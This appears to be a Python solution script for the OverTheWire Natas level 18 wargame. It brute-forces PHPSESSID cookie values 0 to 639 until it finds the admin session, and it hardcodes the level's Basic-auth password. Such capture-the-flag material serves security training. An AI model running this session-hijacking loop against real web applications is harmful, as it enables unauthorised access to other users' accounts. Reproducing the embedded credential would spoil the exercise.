
import requests
from requests.auth import HTTPBasicAuth

import string
import time
import base64

def string_to_hex(s):
    return ''.join(format(ord(char), '02x') for char in s)


URL = "http://natas18.natas.labs.overthewire.org"
data ={'username':""}
params = {'username':'admin', 'password':'123'}

username = "natas18"
password = "6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ"
headers = {"authorization":'Basic {0}'.format(base64.b64encode(f"{username}:{password}".encode()).decode())}
cookies = {'PHPSESSID':''}

for i in range(640):
    cookies['PHPSESSID'] = str(i)

    response = requests.get(URL,headers=headers, cookies=cookies)
    # print(response.text)
    if "You are an admin" in response.text:
        print(response.text)
        break
